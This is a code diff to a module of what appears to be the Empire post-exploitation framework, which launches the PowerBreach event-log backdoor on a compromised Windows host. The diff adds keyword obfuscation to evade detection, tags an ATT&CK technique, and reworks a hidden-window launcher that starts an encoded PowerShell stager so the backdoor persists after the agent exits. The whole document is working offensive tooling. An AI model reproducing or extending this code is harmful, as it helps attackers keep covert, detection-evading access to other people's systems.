@@ -1,9 +1,11 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
+
 import os
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
-import pdb
+
 
 class Module(object):
 
@@ -15,6 +17,10 @@ class Module(object):
             'Author': ['@sixdub'],
 
             'Description': ('Starts the event-loop backdoor.'),
+
+            'Software': '',
+
+            'Techniques': ['T1084'],
 
             'Background' : False,
 
@@ -138,8 +144,7 @@ Invoke-EventLogBackdoor"""
                 return ""
             else:
                 script = script.replace("REPLACE_LAUNCHER", stagerCode)
-                script = script.encode('ascii', 'ignore')
-        
+
         for option,values in self.options.items():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "outfile":
                 if values['Value'] and values['Value'] != '':
@@ -162,8 +167,10 @@ Invoke-EventLogBackdoor"""
             print(helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile))
             return ""
 
+        script = helpers.keyword_obfuscation(script)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
@@ -172,10 +179,10 @@ Invoke-EventLogBackdoor"""
         parts = stagerCode.split(" ")
 
         # set up the start-process command so no new windows appears
-        scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
-        if obfuscate:
-            scriptLauncher = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
+        script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
 
-        print(scriptLauncher)
-        
-        return scriptLauncher
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+        script = helpers.keyword_obfuscation(script)
+
+        return script
